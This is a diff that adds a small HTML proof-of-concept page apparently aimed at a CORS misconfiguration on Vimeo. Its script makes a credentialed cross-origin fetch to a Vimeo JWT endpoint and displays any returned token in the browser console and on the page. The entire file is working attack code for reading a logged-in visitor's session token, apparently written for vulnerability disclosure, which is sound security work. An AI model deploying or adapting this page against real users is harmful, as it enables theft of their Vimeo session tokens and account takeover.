@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Vimeo JWT PoC</title>
+</head>
+<body>
+    <h1>Vimeo JWT CORS PoC</h1>
+    <p>Open the browser console to see the token.</p>
+    <script>
+        fetch("https://vimeo.com/_next/jwt", {
+            credentials: "include"
+        })
+        .then(response => response.text())
+        .then(token => {
+            console.log("Vimeo JWT:", token);
+            document.body.insertAdjacentHTML('beforeend', `<pre>${token}</pre>`);
+        })
+        .catch(err => console.error("Error fetching token:", err));
+    </script>
+</body>
+</html>
